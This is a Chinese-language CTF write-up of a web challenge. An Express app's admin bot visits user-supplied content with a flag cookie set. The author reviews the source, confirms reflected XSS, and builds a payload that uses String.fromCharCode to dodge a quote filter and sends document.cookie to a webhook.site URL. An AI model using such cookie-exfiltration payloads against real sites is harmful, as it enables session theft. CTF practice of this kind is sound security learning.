感觉多花点时间去琢磨而不是直接去看答案确实会收获好大

先审源码

```js
const express = require('express')
const puppeteer = require('puppeteer');
const cookieParser = require("cookie-parser");
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express()
const port = process.env.PORT || 3000

const CONFIG = {
  APPURL: process.env['APPURL'] || `http://127.0.0.1:${port}`,
  APPFLAG: process.env['APPFLAG'] || "fake{flag}",
}
console.table(CONFIG)

const limiter = rateLimit({
	windowMs: 60 * 1000, // 1 minute
	limit: 4, // Limit each IP to 4 requests per `window` (here, per minute).
	standardHeaders: 'draft-7',
	legacyHeaders: false,
})

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.set('views', __dirname + '/views');
app.use(express.static("./public"));
app.engine('html', require('ejs').renderFile);
app.set('view engine', 'ejs');

function sleep(s){
  return new Promise((resolve)=>setTimeout(resolve, s))
}

app.get('/', (req, res) => {
  res.render('index.html');
})

app.get('/admin/view', (req, res) => {
  if (req.cookies.flag === CONFIG.APPFLAG) {
    res.send(req.query.content);
  }
  else {
    res.send('You are not Walter White!');
  }
})

app.post('/review', limiter,  async (req, res) => {
  const initBrowser = puppeteer.launch({
      executablePath: "/opt/homebrew/bin/chromium",
      headless: true,
      args: [
          '--disable-dev-shm-usage',
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-gpu',
          '--no-gpu',
          '--disable-default-apps',
          '--disable-translate',
          '--disable-device-discovery-notifications',
          '--disable-software-rasterizer',
          '--disable-xss-auditor'
      ],
      ignoreHTTPSErrors: true
  });
  const browser = await initBrowser;
  const context = await browser.createBrowserContext()
  const content = req.body.content.replace("'", '').replace('"', '').replace("`", '');
  const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;
  try {
      const page = await context.newPage();
      await page.setCookie({
          name: "flag",
          httpOnly: false,
          value: CONFIG.APPFLAG,
          url: CONFIG.APPURL
      })
      await page.goto(urlToVisit, {
          waitUntil: 'networkidle2'
      });
      await sleep(1000);
      // Close
      await context.close()
      res.redirect('/')
  } catch (e) {
      console.error(e);
      await context.close();
      res.redirect('/')
  }
})

app.listen(port, () => {
  console.log(`Purdue winning on port ${port}`)
})
```

明显的问题在/review的路由下面，然后本地搭了一个简陋的版本发现构造

```
http://127.0.0.1:3000/test?content=<script>alert("666")</script>
```

会弹框，做实为xss漏洞，然后考虑怎么出网，原本担心有同源策略

后面发现同源策略它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，

在脚本内部执行是可以的比如这样就可以成功（为什么没有尝试）

```
http://127.0.0.1:3000/test?content=%3Cscript%3Efetch(%22https://webhook.site/9878cda8-3dd6-4caf-959a-ab2632d70dc4?flag=test%22)%3C/script%3E
```

然后构造exp，直接用asill码就可以，别用浏览器本身测试！！会有同源策略的限制

```js
<script>fetch(String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 57, 56, 55, 56, 99, 100, 97, 56, 45, 51, 100, 100, 54, 45, 52, 99, 97, 102, 45, 57, 53, 57, 97, 45, 97, 98, 50, 54, 51, 50, 100, 55, 48, 100, 99, 52, 63, 102, 108, 97, 103, 61)%2bdocument.cookie)</script>

```

然后即可拿到flag！！！困扰最大的难题竟然是自己的出网策略:sob:

![image-20240419152802598](C:/Users/86186/Desktop/write-up/ctfs/b01lersCTF/assets/image-20240419152802598.png)

原来之前本地测试的时候是127.0.0.1的域名然后本地服务器默认cors所以不能访问webhook，但是当时应该服务器是可以的，可以抓包试试